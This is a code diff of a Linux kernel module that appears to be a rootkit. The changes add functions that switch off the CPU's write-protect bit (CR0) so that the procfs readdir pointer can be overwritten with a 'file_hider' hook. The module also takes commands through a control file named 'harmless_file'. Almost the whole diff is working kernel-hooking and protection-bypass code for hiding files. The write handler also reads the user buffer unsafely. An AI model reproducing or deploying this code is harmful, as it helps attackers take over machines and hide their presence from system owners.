@@ -7,10 +7,19 @@
 #include <linux/cred.h>
 #include <linux/init.h>
 
-
 #define CONTROL_FILE "harmless_file"
-#define ADDR_RW 0 
-#define ADDR_RO 1
+
+
+#define CR0_PAGE_WP 0x10000
+
+static inline void disable_wp(void){
+	write_cr0(read_cr0() & (~ CR0_PAGE_WP));
+}
+
+static inline void enable_wp(void){
+	write_cr0(read_cr0() | CR0_PAGE_WP);
+
+}
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Michal Antonczak");
@@ -22,22 +31,6 @@ static struct file_operations *procfs_fops;
 static char internal_buffer[1024];
 
 static int (*procfs_readdir_proc)(struct file*, void*, filldir_t);
-
-static void set_mem(void *p, int mode){
-	unsigned int lvl;
-	pte_t* pte;
-	pte = lookup_address((unsigned long)p , &lvl);
-
-	if(mode == ADDR_RW){
-		pte->pte |= _PAGE_RW;	
-	} 
-
-	if(mode == ADDR_RO){
-		pte->pte &= ~_PAGE_RW;
-	}
-		
-
-}
 
 static filldir_t kernel_filldir;
 
@@ -68,10 +61,12 @@ static int control_read(char *buffer, char **buffer_location, off_t off, int cou
 }
 
 static int control_write(struct file* file, const char __user * buf, unsigned long count, void *data ){
+
 	if(!strncmp("test", buf, count)){
 		printk(KERN_INFO"received command");
 	}	
-	printk(KERN_INFO"random write");
+	snprintf(internal_buffer,1024,"%s", buf);
+	printk(KERN_INFO"random write received: %s", internal_buffer);
 	return count;
 }
 
@@ -96,14 +91,16 @@ static int proc_init(void){
 	parent = proc_control -> parent;
 	procfs_fops = (struct file_operations *) parent->proc_fops;
 
-	set_mem(procfs_fops -> readdir, ADDR_RW);
-
 	procfs_readdir_proc = procfs_fops -> readdir;
 	
-	procfs_fops -> readdir = file_hider;
-		
-	set_mem(procfs_fops -> readdir, ADDR_RO);
+	printk(KERN_INFO"readdir");
 
+	disable_wp();
+	procfs_fops -> readdir = file_hider;
+	enable_wp();
+	printk(KERN_INFO"post-readdir");
+	
+	printk(KERN_INFO"out of proc init");
 	return 0; 
 	
 }
@@ -112,11 +109,13 @@ static void proc_cleanup(void){
 
 	remove_proc_entry(CONTROL_FILE,NULL);
 
-	set_mem(procfs_fops -> readdir, ADDR_RW);
+//	WP_DISABLE();
 
+	disable_wp();
 	procfs_fops -> readdir = procfs_readdir_proc ;
-		
-	set_mem(procfs_fops -> readdir, ADDR_RO);
+	enable_wp();
+//	WP_ENABLE();
+	
 
 }
 
